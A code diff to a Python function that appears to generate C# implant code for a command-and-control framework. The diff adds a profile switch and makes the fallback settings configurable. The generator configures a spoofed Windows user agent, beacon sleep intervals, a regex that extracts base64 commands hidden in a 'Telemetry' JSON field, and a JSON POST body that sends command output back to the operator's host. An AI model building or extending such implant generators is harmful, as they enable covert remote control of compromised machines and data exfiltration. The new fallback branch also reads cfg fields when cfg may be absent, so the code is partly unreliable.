@@ -24,9 +24,9 @@ def _emit_post_json_expr(mapping: dict | None) -> str:
 	return f"\"{templ}\""
 
 
-def program(ip, port, cfg=None, scheme="https"):
+def program(ip, port, cfg=None, scheme="https", profile=False):
 	base_url = f"{scheme}://{ip}:{port}"
-	if cfg:
+	if profile:
 		print(cfg)
 		ua = cfg.useragent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 		get_url  = base_url.rstrip("/") + cfg.get_uri
@@ -39,6 +39,8 @@ def program(ip, port, cfg=None, scheme="https"):
 		try:
 			if getattr(cfg, "byte_range", None) is not None and str(cfg.byte_range).strip().isdigit():
 				range_line = f'getReq.Headers.Range = new RangeHeaderValue(0, {int(cfg.byte_range)});'
+			else:
+				range_line = ""
 		except Exception:
 			range_line = ""
 
@@ -78,13 +80,26 @@ def program(ip, port, cfg=None, scheme="https"):
 		post_json_expr = _emit_post_json_expr(getattr(cfg, "post_client_mapping", None))
 
 	else:
-		# legacy hardcoded defaults
+		"""# legacy hardcoded defaults
 		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 		get_url = post_url = f"{base_url}/"
 		get_headers = post_headers = ""
 		accept_line = host_line = range_line = ""
 		accept_post = ""
 		sleep_short, sleep_long = 2000, 5000
+		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
+		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'"""
+		# legacy hardcoded defaults
+		
+		ua = cfg.useragent if cfg.useragent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+		get_url = post_url = f"{base_url}/"
+		get_headers = cfg.headers_get if cfg.headers_get else ""
+		post_headers = cfg.headers_post if cfg.headers_post else ""
+		accept_line = cfg.accept if cfg.accept else ""
+		host_line = cfg.host if cfg.host else ""
+		range_line = cfg.byte_range if cfg.byte_range else ""
+		accept_post = ""
+		sleep_short, sleep_long = cfg.interval_ms, 5000
 		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
 		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'
 
